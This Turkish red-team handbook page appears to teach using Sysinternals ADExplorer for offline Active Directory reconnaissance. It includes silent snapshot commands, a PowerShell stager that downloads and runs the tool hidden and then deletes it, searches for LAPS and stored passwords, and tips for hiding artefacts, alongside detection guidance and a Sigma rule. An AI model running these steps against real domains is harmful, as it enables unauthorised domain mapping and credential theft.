# ADExplorer

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Sysinternals gelişmiş Active Directory yönetim ve gezinti aracı; canlı AD veritabanı anlık görüntüsü alma (`-snapshot`), çevrimdışı LDAP analizi, LAPS ve ACL denetimi ve nesne karşılaştırma.

---

## 1. Genel Bakış ve Amaç

`ADExplorer.exe` (Active Directory Explorer), Microsoft Sysinternals ekibi (Mark Russinovich) tarafından geliştirilmiş, resmi Microsoft dijital imzasına sahip gelişmiş bir Active Directory gezinti, arama ve yönetim aracıdır. Windows işletim sisteminde yerleşik olarak bulunan `dsa.msc` (Active Directory Kullanıcıları ve Bilgisayarları) konsolunun çok ötesinde yeteneklere sahiptir.

Red Team operasyonlarında ve profesyonel sızma testlerinde `ADExplorer.exe`, saldırganın hedef etki alanındaki on binlerce kullanıcı, bilgisayar, grup, GPO ve erişim denetim listesi (ACL/ACE) yapılandırmasını **tek bir oturumda saniyeler içinde çevrimdışı bir `.dat` dosyasına dökmesi** ve ardından hedef ağda hiçbir ek LDAP trafiği oluşturmadan analizini kendi yerel sisteminde yürütmesi için paha biçilmez bir keşif silahıdır.

Alınan bu snapshot dosyaları, üçüncü parti açık kaynaklı araçlar (`AdxHound`, `BloodHound.py -adx`) aracılığıyla doğrudan **BloodHound** uyumlu JSON formatına dönüştürülebilir. Bu sayede hedef ağda gürültülü ve EDR tarafından kolayca yakalanan `SharpHound.exe` çalıştırmak yerine, resmi ve güvenilir bir Microsoft Sysinternals ikili dosyası ile tüm etki alanı topolojisi haritalanabilir.

### Protokol ve Çalışma Prensibi

`ADExplorer`, standart **LDAP (TCP 389)** veya şifreli **LDAPS (TCP 636)** protokolleri üzerinden Active Directory veritabanı (`NTDS.DIT`) ile iletişim kurar:

```
┌──────────────────────────────────────────────────────────────┐
│                    Saldırgan Makinesi                        │
│                     [ ADExplorer.exe ]                       │
└──────────────────────────────┬───────────────────────────────┘
                               │
            1. LDAP Bind (NTLM / Kerberos SSP)                 
            2. Rekürsif RootDSE Taraması: (objectClass=*)       
            3. Sayfalama (LDAP Paging) & Tüm Öznitelikler      
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                 Etki Alanı Denetleyicisi (DC)                │
│                 [ NTDS.DIT / Active Directory ]              │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) Snapshot Modu (-snapshot "" out.dat):
         Tüm AD Ağacı İkili .DAT Formatında Diske Yazılır!
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                  Snapshot Dosyası (ad.dat)                   │
│   - Saldırgan Yerel Makinesine Taşınır (Exfiltration)        │
│   - Çevrimdışı Olarak ADExplorer GUI ile Açılabilir          │
│   - AdxHound ile BloodHound JSON Formatına Dönüştürülür      │
│   - LAPS Parolaları (ms-Mcs-AdmPwd) ve ACL'ler İncelenir     │
└──────────────────────────────────────────────────────────────┘
```

1. **Toplu LDAP Taraması:** `-snapshot ""` komutu verildiğinde, `ADExplorer` kök dizinden (`rootDSE`) başlayarak tüm nesneleri, güvenlik tanımlayıcılarını (`nTSecurityDescriptor`), grup üyeliklerini ve gizlenmiş öznitelikleri standart LDAP sayfalama mekanizmasıyla sorgular.
2. **İkili Veri Paketi (`.dat`):** Dönen tüm LDAP nesneleri şifrelenmemiş ikili bir formatta belirtilen `.dat` dosyasına kaydedilir. Bu dosya, etki alanının o anki durumunun tam bir kopyasıdır.
3. **Çevrimdışı Analiz (Zero Network Footprint):** `.dat` dosyası oluşturulduktan sonra hedef ağdaki operasyonel keşif sona erer. Saldırgan dosyayı kendi analiz laboratuvarına taşır, `ADExplorer` ile çevrimdışı açarak veya `AdxHound` ile BloodHound'a aktararak saldırı yollarını (Attack Paths) tamamen sessizce inceler.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Çevrimdışı Keşif (Zero Detection)** | Hedef ağda yüzlerce LDAP sorgusu yapmak yerine, 30 saniyede tek bir snapshot alıp analizi çevrimdışı yürütme. |
| **BloodHound Veri Toplama (AdxHound)** | `SharpHound` çalıştırmanın EDR tarafından engellendiği sistemlerde, imzalı `ADExplorer` ile BloodHound verisi toplama. |
| **Zaman Farkı Analizi (Compare Snapshots)** | İki farklı tarihte alınan snapshot'ları karşılaştırarak yeni eklenen hesapları, grup değişikliklerini ve yetki yükseltmelerini tespit etme. |
| **LAPS ve Hassas Öznitelik Avı** | Yetkili bir hesapla snapshot alındığında `ms-Mcs-AdmPwd` (LAPS) veya açıklamalara yazılmış parolaları grafik arayüzde arama. |
| **Gelişmiş ACL ve ACE İncelemesi** | Nesneler üzerindeki `GenericAll`, `WriteDacl`, `WriteOwner` ve `DCSync` izinlerini filtreleme. |
| **Sessiz Otomasyon Desteği** | `-snapshot` ve `-accepteula` bayrakları sayesinde GUI açılmadan tamamen komut satırından çalışabilme. |

### BloodHound Toplayıcıları ile Karşılaştırma

| Kriter / Yetenek | `ADExplorer + AdxHound` | `SharpHound.exe` | `BloodHound.py (Linux)` | `LDP.exe` |
|---|---|---|---|---|
| **İmza / Güvenilirlik** | Microsoft Sysinternals İmzalı | Açık Kaynak / EDR İmzalı | Linux İstemcisi | Microsoft Yerleşik |
| **İkili Dosya İndirme İhtiyacı** | Yalnızca meşru ADExplorer | SharpHound binary gerekir | Yok (Linux makineden) | Yok (Windows'ta hazır) |
| **Snapshot Yeteneği** | Var (Özel `.dat` formatı) | Var (ZIP / JSON formatı) | Var (JSON formatı) | Yok |
| **Çevrimdışı İnceleme** | Mükemmel (Kendi GUI'sinde) | BloodHound GUI gerektirir | BloodHound GUI gerektirir | Yok |
| **Oturum / Session Verisi** | Toplamaz (Yalnızca LDAP nesneleri) | Toplar (NetSessionEnum) | Toplar (SMB/RPC) | Toplamaz |
| **EDR Algısı** | Düşük (Sysinternals aracı) | Yüksek (Bilinen imza) | Sıfır (Windows uç noktada yok) | Çok Düşük |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
ADExplorer.exe [-snapshot <hedef_container_DN> <çıktı_dosyası>] [-accepteula]
ADExplorer.exe <kayıtlı_snapshot_dosyası.dat>
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-snapshot <DN> <Dosya>` | Belirtilen DN altındaki tüm nesnelerin anlık görüntüsünü diske kaydeder. | `ADExplorer.exe -snapshot "" C:\Temp\ad.dat` |
| `-snapshot ""` | Kök dizinden (tüm etki alanından) başlayarak eksiksiz snapshot alır. | `ADExplorer.exe -snapshot "" out.dat` |
| `-accepteula` | Sysinternals son kullanıcı lisans sözleşmesini grafik pencere açmadan sessizce kabul eder. | `ADExplorer.exe -accepteula` |
| `<Dosya.dat>` | Daha önceden kaydedilmiş bir snapshot dosyasını çevrimdışı görüntülemek üzere açar. | `ADExplorer.exe C:\Temp\ad.dat` |

### Grafik Arayüz Arama ve Filtreleme Yetenekleri

`ADExplorer` GUI arayüzünde **Search Container** (`Ctrl+F`) menüsü, LDAP filtrelerine gerek kalmadan güçlü arama kombinasyonları sunar:
- **Attribute:** Sorgulanacak öznitelik (Örn: `adminCount`, `servicePrincipalName`, `ms-Mcs-AdmPwd`, `userAccountControl`).
- **Relation:** Karşılaştırma operatörü (`is`, `is not`, `starts with`, `ends with`, `contains`, `is present`).
- **Value:** Aranacak değer (`1`, `*`, `MSSQL*` vb.).

### Kayıt Defteri EULA Bypass Yapılandırması

Otomasyon script'lerinde `-accepteula` parametresinin gözden kaçması GUI penceresinin kilitlenmesine yol açabilir. Bunu önlemek için komut çalıştırılmadan önce doğrudan kayıt defterine onay anahtarı yazılabilir:

```cmd
reg add "HKCU\Software\Sysinternals\Active Directory Explorer" /v EulaAccepted /t REG_DWORD /d 1 /f
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Komut Satırından Başlıksız ve Sessiz AD Snapshot Alma

Saldırgan ele geçirdiği uç noktada arka planda tüm Active Directory veritabanının anlık görüntüsünü alır:

```cmd
ADExplorer.exe -snapshot "" C:\Windows\Temp\domain_snapshot.dat -accepteula
```

**İşlem Aşamaları:**
1. Araç, etki alanı denetleyicisi ile geçerli oturum açmış kullanıcının kimlik bilgileriyle (Kerberos/NTLM) otomatik bir LDAP oturumu açar.
2. Tüm nesneler taranır ve `C:\Windows\Temp\domain_snapshot.dat` dosyasına yazılır.
3. İşlem tamamlandığında süreç kendiliğinden kapanır; ekranda hiçbir pencere açılmaz.

---

### Senaryo 2: Yalnızca Kritik Bir Organizasyonel Birimin (OU) Snapshot'ını Alma

Büyük etki alanlarında dosya boyutunu küçültmek ve tarama süresini kısaltmak için yalnızca yöneticilerin bulunduğu OU hedeflenebilir:

```cmd
ADExplorer.exe -snapshot "OU=Privileged Accounts,DC=lab,DC=local" C:\Windows\Temp\tier0.dat -accepteula
```

---

### Senaryo 3: Snapshot Dosyasını Saldırgan Makinesinde BloodHound Verisine Dönüştürme

Elde edilen `domain_snapshot.dat` dosyası saldırganın Linux analiz makinesine indirildikten sonra `AdxHound` aracı ile BloodHound JSON dosyalarına dönüştürülür:

```bash
# AdxHound ile .dat dosyasını BloodHound zip formatına çevirme:
python3 -m pip install adxhound
adxhound -f domain_snapshot.dat -o /tmp/bloodhound_data/
```

**Örnek Çıktı:**
```text
[*] Parsing ADExplorer snapshot: domain_snapshot.dat
[*] Found 14,210 Active Directory objects.
[+] Parsing Users... Done (12,400 users)
[+] Parsing Computers... Done (1,500 computers)
[+] Parsing Groups & Memberships... Done (310 groups)
[+] Parsing Domain Trusts... Done (2 trusts)
[+] Parsing ACLs & ACEs... Done (45,000 ACL entries)
[+] Successfully generated BloodHound archive: /tmp/bloodhound_data/20261014_bloodhound.zip
```
Oluşturulan zip arşivi doğrudan BloodHound GUI'sine yüklenerek saldırı yolları (Shortest Path to Domain Admins) analiz edilir!

---

### Senaryo 4: İki Snapshot'ı Karşılaştırarak Yeni Eklenen Hesapları ve Yetkileri Avlama

Savunma analistleri veya kalıcılık denetimi yapan sızma testçileri iki farklı tarihte alınan snapshot'ı kıyaslar:
1. `ADExplorer.exe` grafik arayüzünde ilk snapshot açılır.
2. Üst menüden **File -> Compare Snapshots** seçeneği tıklanır ve ikinci snapshot dosyası gösterilir.
3. Araç, iki zaman dilimi arasında:
   - Yeni eklenen kullanıcı ve bilgisayarları,
   - Değiştirilen parola damgalarını (`pwdLastSet`),
   - Ayrıcalıklı gruplara (`Domain Admins`) sonradan eklenen üyeleri
   fark tablosu olarak yeşil/kırmızı renklerle listeler.

---

### Senaryo 5: LAPS Parolalarını (ms-Mcs-AdmPwd) ve Açık Parolaları Arama

Eğer oturum açmış kullanıcı veya bilgisayar hesabı LAPS okuma yetkisine sahipse, `ADExplorer` GUI içinde:
1. `Ctrl+F` basılarak arama penceresi açılır.
2. `Attribute`: `ms-Mcs-AdmPwd` seçilir.
3. `Relation`: `is present` seçilir ve **Search** butonuna basılır.
4. Çıkan tüm bilgisayar hesaplarının yan panelinde açık metin yerel yönetici parolaları görüntülenir.

Ayrıca `description` veya `info` alanında parola aramak için:
- `Attribute: description`, `Relation: contains`, `Value: pass`

---

### Senaryo 6: Farklı Bir Kullanıcı Bağlamında ADExplorer Başlatma

Ele geçirilen bir etki alanı yöneticisi kimliğiyle oturum açarak snapshot almak:

```cmd
runas /netonly /user:LAB\da_admin "C:\Tools\ADExplorer.exe -snapshot \"\" C:\Temp\ad_admin.dat -accepteula"
```

---

### Senaryo 7: PowerShell ile ADExplorer İndirip Snapshot Alan Tek Satırlık Stager

Hedef makinede ADExplorer bulunmuyorsa, belleğe indirip çalıştıran operasyonel betik:

```powershell
# ADExplorer indir, snapshot al ve izleri temizle:
$webclient = New-Object System.Net.WebClient
$tempExe = "$env:TEMP\adx.exe"
$tempDat = "$env:TEMP\ad.dat"

# EULA kaydını önceden enjekte et
Set-ItemProperty -Path "HKCU:\Software\Sysinternals\Active Directory Explorer" -Name "EulaAccepted" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue

# Resmi Microsoft Sysinternals live sitesinden indir
$webclient.DownloadFile("https://live.sysinternals.com/ADExplorer.exe", $tempExe)

# Snapshot al
Start-Process -FilePath $tempExe -ArgumentList "-snapshot `"`" `"$tempDat`" -accepteula" -Wait -WindowStyle Hidden

# Binary'yi temizle (yalnızca dat kalsın)
Remove-Item $tempExe -Force
Write-Host "[+] Snapshot başarıyla oluşturuldu: $tempDat" -ForegroundColor Green
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Durum | Olası Neden | Çözüm Adımı |
|---|---|---|
| Komut askıda kalıyor (Hangs / Freezes) | `-accepteula` bayrağı unutulmuştur; arka planda onay bekleyen görünmez bir EULA penceresi açılmıştır. | Komuta `-accepteula` ekleyin veya çalıştırmadan önce kayıt defterine `EulaAccepted = 1` anahtarını yazın. |
| `Error connecting to Active Directory: The server is not operational (0x8007203a)` | İstemci etki alanı denetleyicisi ile LDAP portları (TCP 389/636) üzerinden iletişim kuramamaktadır. | Ağ ve DNS yapılandırmasını kontrol edin; DC IP'sini pingleyin veya `nltest /dsgetdc` ile etki alanı bağlantısını test edin. |
| `Snapshot failed: Out of memory` | 100.000+ nesneye sahip devasa kurumsal etki alanlarında 32-bit `ADExplorer.exe` bellek sınırına (2 GB) takılmaktadır. | 64-bit sürümü (`ADExplorer64.exe`) kullanın veya `-snapshot` ile kapsamı belirli OU'larla sınırlandırın. |
| `AdxHound parsing error: Invalid format` | Kullanılan `AdxHound` sürümü eski kalmıştır veya snapshot işlemi tamamlanmadan dosya taşınmıştır. | Snapshot işleminin bittiğini süreç yöneticisinden doğrulayın ve `AdxHound` aracını en son sürüme güncelleyin. |
| `Failed to read nTSecurityDescriptor` | Kullanıcının bazı korumalı nesnelerin (AdminSDHolder vb.) güvenlik tanımlayıcılarını okuma izni yoktur. | Düşük yetkili hesapla nesnelerin çoğu okunur; tam ACL analizi için etki alanı kullanıcısı veya yönetici bağlamı gerekir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Uç Nokta Olay Günlükleri (Endpoint Logs):**
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `ADExplorer.exe` çalıştırılması, argümanları (`-snapshot`, `-accepteula`) ve dosya hash'i kaydedilir.
  - **Sysmon Event ID 11 (File Create):** Hedef dizinde oluşturulan `*.dat` uzantılı snapshot dosyası kaydedilir.
  - **Sysmon Event ID 13 (Registry Value Set):** `HKCU\Software\Sysinternals\Active Directory Explorer\EulaAccepted` kaydı oluşur.
- **Etki Alanı Denetleyicisi Günlükleri (DC Logs):**
  - **Directory Service Event ID 1644 (LDAP Search Query):** DC üzerinde `Field Engineering` denetimi açıksa, `(objectClass=*)` filtresiyle on binlerce kaydı tek seferde çeken bu sorgu **Pahalı ve Verimsiz Sorgu (Expensive/Inefficient LDAP Query)** olarak loglanır.

### 5.2 Ağ ve EDR İmzaları

- **Sysinternals Güveni:** `ADExplorer.exe`, Microsoft Corporation tarafından imzalanmış meşru bir yönetim aracıdır. Antivirüsler ve AppLocker tarafından engellenmez.
- **Yoğun LDAP Trafiği:** Snapshot alma işlemi başladığında istemciden DC'ye doğru birkaç dakika boyunca sürekli ve yoğun bir LDAP veri akışı gerçekleşir. Bu trafik, ağ anomali tespit sistemleri (Zeek, Darktrace) ve Microsoft Defender for Identity (MDI) tarafından **Domain Reconnaissance (Reconnaissance using LDAP)** olarak işaretlenebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | Kullanıcı hesaplarını ve özniteliklerini topluca çekme. |
| **T1069.002** | Permission Groups Discovery: Domain Groups | Grup hiyerarşisini ve üyeliklerini haritalama. |
| **T1482** | Domain Trust Discovery | Etki alanı ve orman güven ilişkilerini dökme. |
| **T1005** | Data from Local System | Canlı AD veritabanını tek dosya halinde diske çıkarma. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **Kapsamlı LDAP Taraması (MDI Alarmı)** | Tüm etki alanını (`-snapshot ""`) tek seferde çekmek yerine, yalnızca ilgilendiğiniz departman veya sunucu OU'sunun snapshot'ını alın. |
| **EULA Kayıt Defteri İzi** | `EulaAccepted` anahtarını elle eklediyseniz, snapshot tamamlandıktan sonra bu kayıt defteri anahtarını silin: `reg delete "HKCU\Software\Sysinternals\Active Directory Explorer" /f`. |
| **`*.dat` Dosya Adı İmzası** | Diske yazılan dosyaya `ad_snapshot.dat` yerine masum görünen bir sistem dosya adı verin: `C:\Windows\Temp\perfmon_cache.dat`. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Microsoft Defender for Identity (MDI):** MDI sensörleri, tek bir iş istasyonundan etki alanındaki tüm nesneleri listeleyen anormal LDAP aramalarını tespit ederek "Suspected reconnaissance activity (LDAP)" uyarısı üretir.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Active Directory Snapshot via ADExplorer
  status: high
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith:
              - '\ADExplorer.exe'
              - '\ADExplorer64.exe'
          CommandLine|contains:
              - '-snapshot'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 Tüm Etki Alanının Snapshot'ını CLI'dan Sessizce Alma
```cmd
ADExplorer.exe -snapshot "" C:\Windows\Temp\ad_snap.dat -accepteula
```
- **Ne Yapar?** Kök dizinden başlayarak tüm etki alanı nesnelerini, gruplarını ve ACL'lerini tek bir `.dat` dosyasında depolar.
- **Ne Zaman Kullanılır?** Çevrimdışı analiz veya BloodHound aktarımı için sıfır gürültüyle veri toplamak amacıyla.
- **Parametreler:** `-snapshot ""` (Tüm etki alanı), `C:\Windows\Temp\ad_snap.dat` (Çıktı dosyası), `-accepteula` (Pencere açmadan kabul et).

### 6.2 Yalnızca Belirli Bir OU'nun Snapshot'ını Alma
```cmd
ADExplorer.exe -snapshot "OU=Users,DC=lab,DC=local" C:\Temp\users.dat -accepteula
```
- **Ne Yapar?** Yalnızca belirtilen Organizasyonel Birim altındaki nesneleri anlık görüntüye kaydeder.
- **Ne Zaman Kullanılır?** Büyük etki alanlarında tarama süresini ve dosya boyutunu küçültmek için.
- **Parametreler:** `-snapshot "<OU_DN>"`.

### 6.3 EULA Lisans Onayını Kayıt Defterine Önceden Yazma
```cmd
reg add "HKCU\Software\Sysinternals\Active Directory Explorer" /v EulaAccepted /t REG_DWORD /d 1 /f
```
- **Ne Yapar?** Sysinternals lisans sözleşmesini kayıt defteri üzerinden önceden kabul eder.
- **Ne Zaman Kullanılır?** Otomasyon script'lerinde ADExplorer'ın GUI lisans penceresinde kilitlenmesini engellemek için.
- **Parametreler:** `/v EulaAccepted`, `/t REG_DWORD`, `/d 1`.

### 6.4 Çevrimdışı Snapshot Dosyasını GUI İle Açma
```cmd
ADExplorer.exe C:\Temp\ad_snap.dat
```
- **Ne Yapar?** Daha önceden alınmış olan `.dat` snapshot dosyasını grafik arayüzde gezilebilir bir Active Directory ağacı olarak açar.
- **Ne Zaman Kullanılır?** Hedef ağdan çıktıktan sonra saldırganın kendi makinesinde çevrimdışı inceleme yapması için.
- **Parametreler:** `<SnapshotDosyası.dat>`.

### 6.5 Farklı Kimlik Bilgisiyle (Runas) ADExplorer Başlatma
```cmd
runas /netonly /user:LAB\da_admin "ADExplorer.exe"
```
- **Ne Yapar?** Geçerli Windows oturumunu bozmadan, yalnızca ağ isteklerinde kullanılmak üzere etki alanı yöneticisi kimliğiyle ADExplorer'ı başlatır.
- **Ne Zaman Kullanılır?** Düşük yetkili bir iş istasyonunda ele geçirilen yetkili kimlikle snapshot almak için.
- **Parametreler:** `/netonly`, `/user:<Domain\Kullanıcı>`.

### 6.6 Snapshot Dosyasını Linux'ta BloodHound Formatına Çevirme
```bash
python3 -m adxhound -f ad_snap.dat -o /tmp/bloodhound/
```
- **Ne Yapar?** `ADExplorer` tarafından üretilen `.dat` dosyasını BloodHound'un kabul ettiği JSON formatına ve zip arşivine dönüştürür.
- **Ne Zaman Kullanılır?** `SharpHound` kullanmadan BloodHound grafik analizine veri aktarmak için.
- **Parametreler:** `-f <dosya.dat>`, `-o <çıktı_dizini>`.

### 6.7 64-Bit Binary ile Yüksek Bellekli Büyük Domain Taraması
```cmd
ADExplorer64.exe -snapshot "" C:\Temp\large_ad.dat -accepteula
```
- **Ne Yapar?** 64-bit bellek alanını kullanarak 100.000+ nesneye sahip devasa AD veritabanlarını bellek hatası almadan snapshot'lar.
- **Ne Zaman Kullanılır?** Büyük kurumsal ağlarda 32-bit `Out of memory` hatasını aşmak için.
- **Parametreler:** `ADExplorer64.exe`, `-snapshot ""` (Tüm etki alanı).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — ADExplorer (Sysinternals) | [learn.microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer) |
| GitHub — AdxHound (ADExplorer to BloodHound Converter) | [github.com](https://github.com/morDavid/AdxHound) |
| MITRE ATT&CK T1087.002 (Account Discovery: Domain Account) | [attack.mitre.org](https://attack.mitre.org/techniques/T1087/002/) |
| SpecterOps — BloodHound AD Ingestion Methods | [posts.specterops.io](https://posts.specterops.io/) |

---

> **Önceki:** [← wmic.exe](./wmic.md) · **Sonraki:** [LDP.exe →](./LDP.md)
